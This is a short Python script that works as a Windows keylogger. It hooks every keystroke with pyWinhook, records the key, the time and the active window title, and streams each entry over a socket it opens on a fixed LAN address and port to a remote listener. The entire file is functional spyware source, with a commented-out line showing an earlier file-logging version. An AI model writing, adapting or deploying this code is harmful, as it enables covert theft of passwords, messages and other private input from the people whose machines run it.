import pyWinhook
import pythoncom
import socket

# create a server how lisen the attact host
server = socket.socket()

server.bind(("10.200.201.39", 6666))
server.listen(1)
c, a = server.accept()


def onKeyDown(e):
    s = f"{e.GetKey()} \t {e.Time} \t {e.WindowName}"
    c.send(s.encode())
    # print(s, file =open("log.txt", "a"))
    return 1


hm = pyWinhook.HookManager()
hm.HookKeyboard()

# every evend from the keybord will pawer onKeyDown function
hm.SubscribeKeyDown(onKeyDown)

# make the consol stay even there is no event
pythoncom.PumpMessages()
